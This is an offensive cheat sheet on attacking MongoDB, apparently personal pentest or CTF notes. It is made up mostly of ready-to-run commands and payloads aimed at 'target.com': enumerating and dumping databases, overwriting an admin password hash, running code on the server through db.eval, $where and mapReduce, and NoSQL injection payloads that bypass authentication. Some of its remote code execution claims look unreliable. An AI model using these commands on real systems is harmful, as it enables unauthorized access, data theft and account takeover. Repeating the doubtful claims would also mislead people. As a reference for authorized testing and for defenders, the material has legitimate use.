# mongodb

**Author:** Julien Bongars\
**Date:** 2025-09-25 09:55:18
**Path:**

---

## Connection Methods

**TCP Connection:**

```bash
mongo --port 27017 --host 127.0.0.1
mongo --port 27017 --host target.com
mongo mongodb://target.com:27017/database
```

**Unix Socket:**

```bash
mongo --host /tmp/mongodb-27017.sock
mongo --host /var/run/mongodb/mongodb.sock
```

**With Authentication:**

```bash
mongo -u username -p password --host target.com --port 27017
mongo mongodb://user:pass@target.com:27017/admin
```

## Reconnaissance & Enumeration

**Database Discovery:**

```bash
# List databases
mongo --host target.com --eval "db.adminCommand('listDatabases')"
mongo --host target.com --eval "show dbs"

# List collections in database
mongo --host target.com database --eval "db.listCollections()"
mongo --host target.com database --eval "show collections"
```

**One-liner Enumeration:**

```bash
mongo --host target.com --eval "db.adminCommand('listDatabases').databases.forEach(function(d){print('=== DB: ' + d.name + ' ==='); db=db.getSiblingDB(d.name); db.listCollections().forEach(function(c){print('Collection: ' + c.name); printjson(db[c.name].findOne());})})"
```

## Useful MongoDB Evaluations

**System Information:**

```js
db.version(); // MongoDB version
db.serverStatus(); // Server status
db.isMaster(); // Master/slave info
db.adminCommand("buildInfo"); // Build information
db.stats(); // Database statistics
```

**Authentication & Users:**

```js
db.getUsers(); // List database users
db.adminCommand("usersInfo"); // All users info
db.runCommand({ connectionStatus: 1 }); // Current user privileges
```

**Data Extraction:**

```js
db.listCollections(); // List collections
db.collection.find(); // Dump collection
db.collection.find().limit(5); // First 5 documents
db.collection.find().forEach(printjson); // Pretty print all
db.collection.count(); // Count documents
db.collection.distinct("field"); // Unique values
```

**Update admin password:**

see:

```js
db.admin.updateOne(
  { _id: ObjectId("61ce278f46e0fb0012d47ee4") },
  {
    $set: {
      x_shadow:
        "$6$3PQnfHW5kwahebAm$KNiatOJON1Imt4YUmYsaSArn3R.r0QIFcrpySrqbrRaAfBulrPsqQjc20.WNjgbhIo1In17yytuZDIVxpgAGc/",
    },
  },
);
```

**Administrative Commands:**

```js
db.adminCommand("getCmdLineOpts"); // Configuration options
db.adminCommand("hostInfo"); // Host system info
db.adminCommand("listCommands"); // Available commands
db.adminCommand("getLog", "global"); // View logs
```

## Remote Code Execution

**JavaScript Execution (if enabled):**

```js
// Execute system commands (MongoDB < 4.4 with server-side JS enabled)
db.eval("function() { return ls('/') }");
db.eval("function() { return cat('/etc/passwd') }");

// Newer versions - use $where with system calls
db.collection.find({ $where: "function() { return ls('/etc') }" });
```

**MapReduce RCE:**

```js
// Execute code via MapReduce (deprecated but sometimes available)
db.collection.mapReduce(
  function() {
    emit(1, ls("/etc"));
  },
  function(key, values) {
    return values;
  },
  { out: { inline: 1 } },
);
```

**Server-Side JavaScript (if enabled):**

```js
// Check if server-side JS is enabled
db.adminCommand("getParameter", "*").javascriptEngine;

// Execute shell commands
db.eval("function() { return sh('whoami') }");
db.eval("function() { return sh('cat /etc/passwd') }");
```

**NoSQL Injection Payloads:**

```js
// Authentication bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// Data extraction
{"$where": "this.password.length > 0"}
{"$where": "this.username.match(/admin/)"}
```

## File Operations

**GridFS File Access:**

```js
// List GridFS files
db.fs.files.find();
db.fs.chunks.find();

// Read file content
var file = db.fs.files.findOne({ filename: "config.txt" });
db.fs.chunks
  .find({ files_id: file._id })
  .sort({ n: 1 })
  .forEach(function(chunk) {
    print(chunk.data.toString());
  });
```

## Privilege Escalation

**Role Enumeration:**

```js
db.runCommand({ rolesInfo: 1 }); // List all roles
db.runCommand({ usersInfo: 1 }); // List all users with roles
```

## Common Ports & Default Credentials

**Ports:**

- 27017 (default)
- 27018 (shard)
- 27019 (config server)
- 28017 (web interface)

**Default Credentials:**

- No authentication by default
- Check for blank passwords
- Common usernames: admin, root, mongodb
